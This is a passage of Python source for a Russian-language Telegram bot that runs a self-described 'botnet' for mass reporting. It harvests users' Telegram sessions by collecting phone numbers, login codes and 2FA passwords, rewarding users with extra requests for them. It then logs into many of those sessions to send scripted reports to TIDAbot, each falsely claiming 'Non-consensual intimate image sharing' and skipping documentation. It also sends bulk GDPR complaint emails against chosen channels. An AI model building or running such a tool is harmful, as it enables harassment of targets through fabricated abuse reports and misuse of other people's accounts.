    text = f"📜 <b>История запросов</b> (стр. {page+1}/{total_pages})\n\n"
    for i, h in enumerate(page_items, 1):
        status_emoji = "✅" if h['status'] == 'success' else "❌"
        text += f"{status_emoji} <b>{h['method']}</b>\n"
        text += f"    {h['target'][:40]}\n"
        text += f"    {h['timestamp']}\n\n"
    await safe_edit_or_send(callback.message, text, reply_markup=profile_history_keyboard(page, total_pages), parse_mode="HTML")

@dp.callback_query(F.data == "add_session_type")
async def add_session_type(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if is_user_banned(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    user_states[callback.from_user.id] = {'step': 'choose_type'}
    await safe_edit_or_send(callback.message, "📱 Выберите тип сессии:", reply_markup=session_type_keyboard())

@dp.callback_query(F.data.in_(["session_normal", "session_tida"]))
async def session_type_selected(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    state = user_states.get(user_id, {})
    state['step'] = 'wait_phone'
    state['session_type'] = callback.data
    user_states[user_id] = state
    text = "🎯 <b>Tida сессия</b>\nТребуется американский номер (+1...)." if callback.data == "session_tida" else "📱 <b>Обычная сессия</b>\nОтправьте номер телефона:"
    await safe_edit_or_send(callback.message, text, parse_mode="HTML")

# ==================== GDPR ХЕНДЛЕРЫ ====================
@dp.callback_query(F.data == "gdpr_menu")
async def gdpr_menu(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    remaining = check_and_reset_daily(callback.from_user.id)
    if remaining <= 0 and not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔ Лимит исчерпан!", show_alert=True)
    user_states[callback.from_user.id] = {'step': 'gdpr_channel_link'}
    await safe_edit_or_send(callback.message, "📜 <b>GDPR ЖАЛОБА</b>\n\nОтправка жалобы на нарушение GDPR\n\n📎 Отправьте <b>ссылку на канал/чат</b>:", parse_mode="HTML")

@dp.callback_query(F.data == "gdpr_has_profile_yes")
async def gdpr_has_profile_yes(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    state = user_states.get(user_id, {})
    state['has_profile'] = True
    state['step'] = 'gdpr_user_id'
    user_states[user_id] = state
    await safe_edit_or_send(callback.message, "👤 Отправьте <b>юзернейм или ID</b> пользователя:", parse_mode="HTML")

@dp.callback_query(F.data == "gdpr_has_profile_no")
async def gdpr_has_profile_no(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    state = user_states.get(user_id, {})
    state['has_profile'] = False
    state['user_id_or_username'] = None
    state['step'] = 'gdpr_confirm'
    user_states[user_id] = state
    await safe_edit_or_send(callback.message, "✅ Жалоба будет отправлена <b>без указания пользователя</b>.\n\nНажмите кнопку для отправки:", reply_markup=gdpr_confirm_keyboard(), parse_mode="HTML")

def gdpr_confirm_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="✅ Отправить GDPR жалобу", callback_data="gdpr_send")
    builder.button(text="🔙 Назад", callback_data="text_menu")
    builder.adjust(1)
    return builder.as_markup()

@dp.callback_query(F.data == "gdpr_send")
async def gdpr_send(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    state = user_states.get(user_id, {})
    if state.get('step') != 'gdpr_confirm':
        return
    channel_link = state.get('channel_link', '')
    violation_link = state.get('violation_link', '')
    user_id_or_username = state.get('user_id_or_username', None)
    has_profile = state.get('has_profile', False)
    await safe_edit_or_send(callback.message, "⏳ <b>Отправка GDPR жалобы...</b>", parse_mode="HTML")
    success_count, total_emails, complaint_text = await send_gdpr_email(channel_link, violation_link, user_id_or_username, has_profile)
    status = 'success' if success_count > 0 else 'failed'
    save_report_to_history(user_id, 'GDPR', channel_link, 'GDPR Violation', status)
    use_request(user_id, 'GDPR', channel_link, 'GDPR Violation', status)
    await send_log_report('GDPR', channel_link, 'GDPR Violation', success_count, total_emails, user_id, full_text=complaint_text)
    if user_id in user_states:
        del user_states[user_id]
    await safe_edit_or_send(callback.message, f"✅ <b>GDPR жалоба отправлена!</b>\n\n✅ Успешно: {success_count}/{total_emails}\n📎 Канал: <code>{channel_link}</code>\n📄 Нарушение: <code>{violation_link}</code>\n\n⏳ Кулдаун: 5 минут", parse_mode="HTML")

# ==================== АДМИН-ПАНЕЛЬ ====================
async def show_admin_user_details(message, user_id_str):
    data = load_users_data().get(user_id_str, {})
    rank = get_user_rank(data)
    rank_name = RANKS[rank]['name']
    status = "🔒 Забанен" if data.get('is_banned') else f"{rank_name}"
    limit = get_daily_limit(data)
    days = (datetime.now() - datetime.strptime(data.get('first_use', datetime.now().strftime('%Y-%m-%d')), '%Y-%m-%d')).days + 1
    text = f"👤 <b>{data.get('username', 'unknown')}</b> (<code>{user_id_str}</code>)\nСтатус: {status}\nЗапросов сегодня: {data.get('requests_today', 0)}/{limit}\nДней с ботом: {days}"
    await safe_edit_or_send(message, text, reply_markup=admin_user_actions_keyboard(user_id_str), parse_mode="HTML")

@dp.callback_query(F.data == "admin_panel")
async def admin_panel(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    await safe_edit_or_send(callback.message, "⚙️ <b>Админ-панель</b>", reply_markup=admin_panel_keyboard(), parse_mode="HTML")

# ==================== НАПИСАТЬ ВСЕМ ====================
@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    user_states[callback.from_user.id] = {'step': 'admin_broadcast_text'}
    await safe_edit_or_send(callback.message, "📢 <b>Написать всем</b>\n\nОтправьте текст, который будет разослан всем пользователям бота:", parse_mode="HTML")

# ==================== ЧЕНДЖ ЛИСТ ====================
@dp.callback_query(F.data == "admin_changelog")
async def admin_changelog(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    user_states[callback.from_user.id] = {'step': 'admin_changelog_text'}
    await safe_edit_or_send(callback.message, "📋 <b>Чендж лист</b>\n\nОтправьте текст обновлений (что нового в боте).\nОн будет разослан всем пользователям с заголовком:", parse_mode="HTML")

@dp.callback_query(F.data == "admin_view_sessions")
async def admin_view_sessions(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "", show_alert=True)
    await safe_edit_or_send(callback.message, "👁️ <b>Просмотр сессий</b>\n\nВыберите папку:", reply_markup=admin_view_sessions_keyboard(), parse_mode="HTML")

@dp.callback_query(F.data.in_(["admin_view_dir_normal", "admin_view_dir_tida"]))
async def admin_view_dir(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    dir_map = {"admin_view_dir_normal": SESSIONS_DIR, "admin_view_dir_tida": TIDA_SESSIONS_DIR}
    directory = dir_map.get(callback.data, SESSIONS_DIR)
    sessions = get_sessions_from_dir(directory)
    if not sessions:
        await safe_edit_or_send(callback.message, f"📂 <b>Папка пуста</b>\n\n<code>{directory}</code>", reply_markup=admin_view_sessions_keyboard(), parse_mode="HTML")
        return
    await safe_edit_or_send(callback.message, f"📂 <b>Сессии в папке</b>\n\nВсего: {len(sessions)}", reply_markup=admin_session_view_keyboard(directory, 0), parse_mode="HTML")

@dp.callback_query(F.data.startswith("admin_view_dir_page_"))
async def admin_view_dir_page(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    parts = callback.data.replace("admin_view_dir_page_", "").split("_")
    dir_name = parts[0]
    page = int(parts[1])
    dir_map = {"normal": SESSIONS_DIR, "tida": TIDA_SESSIONS_DIR}
    directory = dir_map.get(dir_name, SESSIONS_DIR)
    sessions = get_sessions_from_dir(directory)
    await safe_edit_or_send(callback.message, f"📂 <b>Сессии (стр. {page+1})</b>\n\nВсего: {len(sessions)}", reply_markup=admin_session_view_keyboard(directory, page), parse_mode="HTML")

@dp.callback_query(F.data.startswith("admin_sess_view_"))
async def admin_sess_view(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    data_part = callback.data.replace("admin_sess_view_", "")
    directory, filename = data_part.split("|", 1)
    if "normal" in directory:
        directory = SESSIONS_DIR
    elif "tida" in directory:
        directory = TIDA_SESSIONS_DIR
    file_path = os.path.join(directory, filename)
    file_size = os.path.getsize(file_path) if os.path.exists(file_path) else 0
    text = f"📄 <b>Информация о сессии</b>\n\n📁 Файл: <code>{filename}</code>\n📏 Размер: {file_size} байт\n📅 Изменен: {datetime.fromtimestamp(os.path.getmtime(file_path)).strftime('%d.%m.%Y %H:%M') if os.path.exists(file_path) else 'N/A'}"
    await safe_edit_or_send(callback.message, text, reply_markup=admin_session_view_actions_keyboard(directory, filename), parse_mode="HTML")

@dp.callback_query(F.data.startswith("admin_sess_delete_from_view_"))
async def admin_sess_delete_from_view(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    data_part = callback.data.replace("admin_sess_delete_from_view_", "")
    directory, filename = data_part.split("|", 1)
    if "normal" in directory:
        directory = SESSIONS_DIR
    elif "tida" in directory:
        directory = TIDA_SESSIONS_DIR
    file_path = os.path.join(directory, filename)
    if os.path.exists(file_path):
        os.remove(file_path)
        await safe_callback_answer(callback, f"✅ {filename} удалена!", show_alert=True)
    sessions = get_sessions_from_dir(directory)
    if not sessions:
        await safe_edit_or_send(callback.message, "📂 <b>Папка пуста</b>", reply_markup=admin_view_sessions_keyboard(), parse_mode="HTML")
    else:
        await safe_edit_or_send(callback.message, f"📂 <b>Сессии</b>\n\nВсего: {len(sessions)}", reply_markup=admin_session_view_keyboard(directory, 0), parse_mode="HTML")

@dp.callback_query(F.data == "admin_users")
async def admin_users(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    await safe_edit_or_send(callback.message, "👥 <b>Пользователи:</b>", reply_markup=admin_users_keyboard(0), parse_mode="HTML")

@dp.callback_query(F.data.startswith("admin_users_"))
async def admin_users_page(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    page = int(callback.data.split("_")[-1])
    await safe_edit_or_send(callback.message, f"👥 <b>Пользователи (стр. {page+1}):</b>", reply_markup=admin_users_keyboard(page), parse_mode="HTML")

@dp.callback_query(F.data.startswith("admin_user_"))
async def admin_user_select(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    user_id_str = callback.data.replace("admin_user_", "")
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data.startswith("admin_ban_"))
async def admin_ban(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    user_id_str = callback.data.replace("admin_ban_", "")
    data = load_users_data()
    if user_id_str in data:
        data[user_id_str]['is_banned'] = True
        save_users_data(data)
        await safe_callback_answer(callback, "🔒 Заблокирован!", show_alert=True)
        try:
            await bot.send_message(int(user_id_str), "🔒 <b>Вы заблокированы администратором</b>", parse_mode="HTML")
        except:
            pass
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data.startswith("admin_unban_"))
async def admin_unban(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    user_id_str = callback.data.replace("admin_unban_", "")
    data = load_users_data()
    if user_id_str in data:
        data[user_id_str]['is_banned'] = False
        save_users_data(data)
        await safe_callback_answer(callback, "🔓 Разблокирован!", show_alert=True)
        try:
            await bot.send_message(int(user_id_str), "🔓 <b>Вы разблокированы!</b>", parse_mode="HTML")
        except:
            pass
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data.startswith("admin_make_admin_"))
async def admin_make_admin(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    user_id_str = callback.data.replace("admin_make_admin_", "")
    data = load_users_data()
    if user_id_str in data:
        data[user_id_str]['is_admin'] = True
        data[user_id_str]['is_helper'] = False
        save_users_data(data)
        await safe_callback_answer(callback, "⭐ Админка выдана!", show_alert=True)
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data.startswith("admin_remove_admin_"))
async def admin_remove_admin(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    user_id_str = callback.data.replace("admin_remove_admin_", "")
    data = load_users_data()
    if user_id_str in data:
        data[user_id_str]['is_admin'] = False
        save_users_data(data)
        await safe_callback_answer(callback, "❌ Админка забрана!", show_alert=True)
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data.startswith("admin_make_helper_"))
async def admin_make_helper(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    user_id_str = callback.data.replace("admin_make_helper_", "")
    data = load_users_data()
    if user_id_str in data:
        data[user_id_str]['is_helper'] = True
        data[user_id_str]['is_admin'] = False
        save_users_data(data)
        await safe_callback_answer(callback, "🛡️ Помощник выдан!", show_alert=True)
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data.startswith("admin_remove_helper_"))
async def admin_remove_helper(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    user_id_str = callback.data.replace("admin_remove_helper_", "")
    data = load_users_data()
    if user_id_str in data:
        data[user_id_str]['is_helper'] = False
        save_users_data(data)
        await safe_callback_answer(callback, "❌ Помощник забран!", show_alert=True)
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data.startswith("admin_add_req_"))
async def admin_add_req(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    user_id_str = callback.data.replace("admin_add_req_", "")
    await safe_edit_or_send(callback.message, "➕ Сколько запросов добавить?", reply_markup=admin_add_requests_keyboard(user_id_str))

@dp.callback_query(F.data.startswith("admin_sub_req_"))
async def admin_sub_req(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    user_id_str = callback.data.replace("admin_sub_req_", "")
    await safe_edit_or_send(callback.message, "➖ Сколько запросов забрать?", reply_markup=admin_sub_requests_keyboard(user_id_str))

@dp.callback_query(F.data.startswith("admin_req_add_"))
async def admin_req_add_amount(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    parts = callback.data.split("_")
    if len(parts) >= 5:
        user_id_str = parts[3]
        try:
            amount = int(parts[4])
            data = load_users_data()
            if user_id_str in data:
                data[user_id_str]['daily_limit'] = data[user_id_str].get('daily_limit', 3) + amount
                save_users_data(data)
                await safe_callback_answer(callback, f"✅ Добавлено {amount}!", show_alert=True)
        except ValueError:
            pass
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data.startswith("admin_req_sub_"))
async def admin_req_sub_amount(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    parts = callback.data.split("_")
    if len(parts) >= 5:
        user_id_str = parts[3]
        try:
            amount = int(parts[4])
            data = load_users_data()
            if user_id_str in data:
                current = data[user_id_str].get('daily_limit', 3)
                data[user_id_str]['daily_limit'] = max(0, current - amount)
                save_users_data(data)
                await safe_callback_answer(callback, f"✅ Забрано {amount}!", show_alert=True)
        except ValueError:
            pass
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data.startswith("admin_req_unlimit_"))
async def admin_req_unlimit(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    user_id_str = callback.data.replace("admin_req_unlimit_", "")
    data = load_users_data()
    if user_id_str in data:
        data[user_id_str]['daily_limit'] = 999
        save_users_data(data)
        await safe_callback_answer(callback, "♾️ Безлимит!", show_alert=True)
    await show_admin_user_details(callback.message, user_id_str)

@dp.callback_query(F.data == "admin_delete_session")
async def admin_delete_session(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    await safe_edit_or_send(callback.message, "🗑️ <b>Удаление сессии</b>\nВыберите папку:", reply_markup=admin_session_folder_keyboard(), parse_mode="HTML")

@dp.callback_query(F.data.in_(["admin_sess_dir_normal", "admin_sess_dir_tida"]))
async def admin_session_dir(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    directory = SESSIONS_DIR if callback.data == "admin_sess_dir_normal" else TIDA_SESSIONS_DIR
    await safe_edit_or_send(callback.message, "🗑️ <b>Сессии:</b>", reply_markup=admin_session_list_keyboard(directory, 0), parse_mode="HTML")

@dp.callback_query(F.data.startswith("admin_sess_list_"))
async def admin_session_list(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    parts = callback.data.split("_")
    directory = SESSIONS_DIR if parts[3] == "normal" else TIDA_SESSIONS_DIR
    page = int(parts[4])
    await safe_edit_or_send(callback.message, f"🗑️ <b>Сессии (стр. {page+1}):</b>", reply_markup=admin_session_list_keyboard(directory, page), parse_mode="HTML")

@dp.callback_query(F.data.startswith("admin_sess_del_"))
async def admin_session_del_confirm(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    directory, filename = callback.data.replace("admin_sess_del_", "").split("|", 1)
    directory = SESSIONS_DIR if directory == "normal" else TIDA_SESSIONS_DIR
    await safe_edit_or_send(callback.message, f"🗑️ <b>Удалить?</b>\n\n📁 <code>{filename}</code>", reply_markup=admin_confirm_delete_keyboard(directory, filename), parse_mode="HTML")

@dp.callback_query(F.data.startswith("admin_sess_confirm_"))
async def admin_session_confirm(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if not is_user_admin(callback.from_user.id):
        return
    directory, filename = callback.data.replace("admin_sess_confirm_", "").split("|", 1)
    directory = SESSIONS_DIR if directory == "normal" else TIDA_SESSIONS_DIR
    file_path = os.path.join(directory, filename)
    if os.path.exists(file_path):
        os.remove(file_path)
        await safe_callback_answer(callback, f"✅ {filename} удалена!", show_alert=True)
    await safe_edit_or_send(callback.message, "🗑️ <b>Сессии:</b>", reply_markup=admin_session_list_keyboard(directory, 0), parse_mode="HTML")

# ==================== ТЕКСТОВЫЙ ХЕНДЛЕР ====================
@dp.message(F.text)
async def universal_text_handler(message: types.Message):
    user_id = message.from_user.id
    if is_user_banned(user_id):
        return await message.answer("⛔ Вы заблокированы.")
    get_user_data(user_id, message.from_user.username)

    state = user_states.get(user_id, {})
    step = state.get('step', '')
    text = message.text.strip()

    # === АДМИН: НАПИСАТЬ ВСЕМ ===
    if step == 'admin_broadcast_text':
        if not is_user_admin(user_id):
            return
        await message.answer(f"⏳ <b>Рассылка...</b>\n\nТекст:\n<code>{text[:100]}...</code>", parse_mode="HTML")
        data = load_users_data()
        sent, failed = 0, 0
        for uid_str in data.keys():
            try:
                await bot.send_message(int(uid_str), f"📢 <b>Сообщение от администрации:</b>\n\n{text}", parse_mode="HTML")
                sent += 1
                await asyncio.sleep(0.1)
            except:
                failed += 1
        if user_id in user_states:
            del user_states[user_id]
        await message.answer(f"✅ <b>Рассылка завершена!</b>\n\n✅ Отправлено: {sent}\n❌ Ошибок: {failed}", parse_mode="HTML")
        return

    # === АДМИН: ЧЕНДЖ ЛИСТ ===
    if step == 'admin_changelog_text':
        if not is_user_admin(user_id):
            return
        await message.answer("⏳ <b>Рассылка чендж листа...</b>", parse_mode="HTML")
        data = load_users_data()
        sent, failed = 0, 0
        changelog_text = f"📋 <b>ЧЕНДЖ ЛИСТ</b>\n🕐 {datetime.now().strftime('%d.%m.%Y %H:%M')}\n\n{text}"
        for uid_str in data.keys():
            try:
                await bot.send_message(int(uid_str), changelog_text, parse_mode="HTML")
                sent += 1
                await asyncio.sleep(0.1)
            except:
                failed += 1
        if user_id in user_states:
            del user_states[user_id]
        await message.answer(f"✅ <b>Чендж лист разослан!</b>\n\n✅ Отправлено: {sent}\n❌ Ошибок: {failed}", parse_mode="HTML")
        return

    # === GDPR ===
    if step == 'gdpr_channel_link':
        channel_link = text.strip()
        if not (channel_link.startswith('http') or channel_link.startswith('t.me/')):
            return await message.answer("⚠️ Неверная ссылка!")
        state['channel_link'] = channel_link
        state['step'] = 'gdpr_violation_link'
        user_states[user_id] = state
        await message.answer("📄 Теперь отправьте <b>ссылку на конкретное нарушение</b>:", parse_mode="HTML")
        return

    if step == 'gdpr_violation_link':
        violation_link = text.strip()
        if not (violation_link.startswith('http') or violation_link.startswith('t.me/')):
            return await message.answer("⚠️ Неверная ссылка!")
        state['violation_link'] = violation_link
        state['step'] = 'gdpr_has_profile'
        user_states[user_id] = state
        await message.answer("👤 <b>Есть ли профиль у нарушителя?</b>", reply_markup=gdpr_has_profile_keyboard())
        return

    if step == 'gdpr_user_id':
        state['user_id_or_username'] = text.strip()
        state['step'] = 'gdpr_confirm'
        user_states[user_id] = state
        await message.answer(f"✅ Данные собраны!\n\n📎 Канал: <code>{state['channel_link']}</code>\n📄 Нарушение: <code>{state['violation_link']}</code>\n👤 Пользователь: <code>{text.strip()}</code>\n\nНажмите кнопку для отправки:", reply_markup=gdpr_confirm_keyboard(), parse_mode="HTML")
        return

    # === ДОБАВЛЕНИЕ СЕССИИ ===
    if step == 'wait_phone':
        phone = text.replace(' ', '')
        if state['session_type'] == 'session_tida' and not phone.startswith(('+1', '1')):
            return await message.answer("❌ Требуется американский номер (+1...).")
        state['phone'] = phone
        state['step'] = 'logging_in'
        user_states[user_id] = state
        await message.answer("⏳ Подключение...")
        try:
            session_name = f"session_{user_id}_{int(asyncio.get_event_loop().time())}"
            save_dir = TIDA_SESSIONS_DIR if state['session_type'] == 'session_tida' else SESSIONS_DIR
            session_path = os.path.join(save_dir, session_name)
            client = await create_working_client(session_path)
            await client.connect()
            try:
                await client.get_me()
                await message.answer("✅ Уже авторизована!")
                await client.disconnect()
                if user_id in user_states:
                    del user_states[user_id]
                return
            except Unauthorized:
                pass
            sent_code = await client.send_code(phone)
            state['step'] = 'wait_code'
            state['client'] = client
            state['session_path'] = session_path
            state['phone_code_hash'] = sent_code.phone_code_hash
            user_states[user_id] = state
            await message.answer(f"✅ Код отправлен на {phone}. Введите его:")
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")
            if user_id in user_states:
                del user_states[user_id]
        return

    if step == 'wait_code':
        try:
            await state['client'].sign_in(state['phone'], state['phone_code_hash'], text)
            me = await state['client'].get_me()
            dc_id = await get_dc_id(state['client'])
            reward = calculate_session_reward(state['session_type'], state['phone'], dc_id)
            if reward > 0:
                data = load_users_data()
                user_id_str = str(user_id)
                data[user_id_str]['daily_limit'] = data[user_id_str].get('daily_limit', 3) + reward
                save_users_data(data)
                await message.answer(f"✅ <b>Сессия добавлена!</b>\n👤 <code>{me.username or me.first_name}</code>\n🌐 DC: {dc_id}\n\n🎁 <b>Награда: +{reward} запросов!</b>", parse_mode="HTML")
            else:
                await message.answer(f"✅ <b>Сессия добавлена!</b>\n👤 <code>{me.username or me.first_name}</code>", parse_mode="HTML")
            await state['client'].disconnect()
            if user_id in user_states:
                del user_states[user_id]
        except SessionPasswordNeeded:
            state['step'] = 'wait_2fa'
            user_states[user_id] = state
            await message.answer("🔐 Требуется пароль 2FA:")
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")
            if user_id in user_states:
                try:
                    await state['client'].disconnect()
                except:
                    pass
                del user_states[user_id]
        return

    if step == 'wait_2fa':
        if text.lower() in ['нет', 'no', 'none']:
            await message.answer("❌ Необходим пароль 2FA.")
            if user_id in user_states:
                try:
                    await state['client'].disconnect()
                except:
                    pass
                del user_states[user_id]
            return
        try:
            await state['client'].check_password(text)
            me = await state['client'].get_me()
            dc_id = await get_dc_id(state['client'])
            reward = calculate_session_reward(state['session_type'], state['phone'], dc_id)
            if reward > 0:
                data = load_users_data()
                user_id_str = str(user_id)
                data[user_id_str]['daily_limit'] = data[user_id_str].get('daily_limit', 3) + reward
                save_users_data(data)
                await message.answer(f"✅ <b>Сессия добавлена!</b>\n👤 <code>{me.username or me.first_name}</code>\n🌐 DC: {dc_id}\n\n🎁 <b>Награда: +{reward} запросов!</b>", parse_mode="HTML")
            else:
                await message.answer(f"✅ <b>Сессия добавлена!</b>\n👤 <code>{me.username or me.first_name}</code>", parse_mode="HTML")
            await state['client'].disconnect()
            if user_id in user_states:
                del user_states[user_id]
        except Exception as e:
            await message.answer(f"❌ Ошибка 2FA: {e}")
        return

    # === БОТНЕТ: ЦЕЛИ ===
    if step == 'report_target':
        if state['target_type'] == 'report_bot':
            state['target_link'] = text
            state['step'] = 'report_reason'
            user_states[user_id] = state
            await message.answer("⚠️ Выберите причину:", reply_markup=reasons_keyboard())
        elif state['target_type'] == 'report_message':
            username, message_id = parse_telegram_link(text)
            if not username or not message_id:
                return await message.answer("⚠️ Неверная ссылка! Формат:\n<code>https://t.me/username/123</code>", parse_mode="HTML")
            state['target_link'] = username
            state['message_id'] = message_id
            state['step'] = 'report_reason'
            user_states[user_id] = state
            await message.answer(f"✅ Сообщение найдено!\n📍 <code>@{username}</code>\n📄 ID: <code>{message_id}</code>\n\n⚠️ Выберите причину:", reply_markup=reasons_keyboard(), parse_mode="HTML")
        return

    if step == 'report_scope':
        if text.lower() in ['весь', 'сообщение']:
            state['scope'] = text.lower()
            state['step'] = 'report_link'
            user_states[user_id] = state
            await message.answer("🔗 Отправьте ссылку-приглашение." if state['visibility'] == 'закрытый' else "🔗 Отправьте ссылку на канал/чат.")
        else:
            await message.answer("Напишите <code>весь</code> или <code>сообщение</code>:", parse_mode="HTML")
        return

    if step == 'report_link':
        state['target_link'] = text
        state['step'] = 'report_reason'
        user_states[user_id] = state
        await message.answer("⚠️ Выберите причину:", reply_markup=reasons_keyboard())
        return

    # === TIDABOT ===
    if step == 'tida_link':
        state['tida_link'] = text
        state['step'] = 'tida_text'
        user_states[user_id] = state
        await message.answer("📝 Отправьте текст жалобы:")
        return

    if step == 'tida_text':
        remaining = check_and_reset_daily(user_id)
        if remaining <= 0 and not is_user_admin(user_id):
            await message.answer("⛔ <b>Лимит исчерпан!</b>", parse_mode="HTML")
            if user_id in user_states:
                del user_states[user_id]
            return
        state['tida_text'] = text
        state['step'] = 'tida_ready'
        user_states[user_id] = state
        on_cooldown, rem_cd = check_cooldown(user_id, 'tidabot')
        if on_cooldown:
            return await message.answer(f"⏳ <b>Кулдаун!</b> {rem_cd // 60} мин.")
        tida_sessions = get_sessions_from_dir(TIDA_SESSIONS_DIR)
        if not tida_sessions:
            return await message.answer("❌ Тида сессии не найдены!")
        await message.answer(f"⏳ Запуск TIDAbot через {len(tida_sessions)} сессий...")
        success_count, fail_count = 0, 0
        for session_file in tida_sessions:
            try:
                temp_path = os.path.join(TEMP_SESSIONS_DIR, f"temp_{session_file.stem}.session")
                shutil.copy2(str(session_file), temp_path)
                client = await create_working_client(temp_path)
                await client.connect()
                try:
                    await client.get_me()
                except Exception:
                    await client.disconnect()
                    fail_count += 1
                    if os.path.exists(temp_path):
                        os.remove(temp_path)
                    continue
                try:
                    await client.send_message("TIDAbot", "/start")
                    await asyncio.sleep(2)
                    await client.send_message("TIDAbot", state['tida_link'])
                    await asyncio.sleep(3)
                    await client.send_message("TIDAbot", "Non-consensual intimate image sharing")
                    await asyncio.sleep(3)
                    await client.send_message("TIDAbot", text)
                    await asyncio.sleep(3)
                    await client.send_message("TIDAbot", "Proceed without documentation")
                    await asyncio.sleep(3)
                    await client.send_message("TIDAbot", "Confirm")
                    await asyncio.sleep(2)
                    await client.disconnect()
                    if os.path.exists(temp_path):
                        os.remove(temp_path)
                    success_count += 1
                    await asyncio.sleep(3)
                except Exception as e:
                    fail_count += 1
                    await client.disconnect()
                    if os.path.exists(temp_path):
                        os.remove(temp_path)
            except Exception as e:
                fail_count += 1
        set_cooldown(user_id, 'tidabot')
        status = 'success' if success_count > 0 else 'failed'
        save_report_to_history(user_id, "TIDAbot", state['tida_link'], text[:50] + "...", status)
        use_request(user_id, "TIDAbot", state['tida_link'], text[:50] + "...", status)
        await send_log_report('TIDAbot', state['tida_link'], 'Auto Report', success_count, len(tida_sessions), user_id, full_text=text)
        if user_id in user_states:
            del user_states[user_id]
        await message.answer(f"✅ TIDAbot завершен!\n✅ Успешно: {success_count}\n❌ Ошибок: {fail_count}\n\n⏳ Кулдаун: 5 минут.")
        return

    # === EMAIL ===
    if step == 'email_screenshots':
        if text.lower() in ['готово', 'пропустить', 'skip', 'no', 'нет']:
            return await send_email_report(message)
        await message.answer("📸 Отправьте скриншоты или напишите <code>готово</code>.", parse_mode="HTML")
        return

    if step == 'email_subject':
        state['email_subject'] = text
        state['step'] = 'email_text'
        user_states[user_id] = state
        await message.answer("📝 Введите текст жалобы:")
        return

    if step == 'email_text':
        state['email_text'] = text
        state['step'] = 'email_screenshots'
        state['screenshots'] = []
        user_states[user_id] = state
        await message.answer("📸 Отправьте скриншоты или напишите <code>пропустить</code>:", parse_mode="HTML")
        return

    await message.answer("❓ Не понимаю. Нажмите /start или кнопку Меню.")

@dp.message(F.photo)
async def handle_email_photo(message: types.Message):
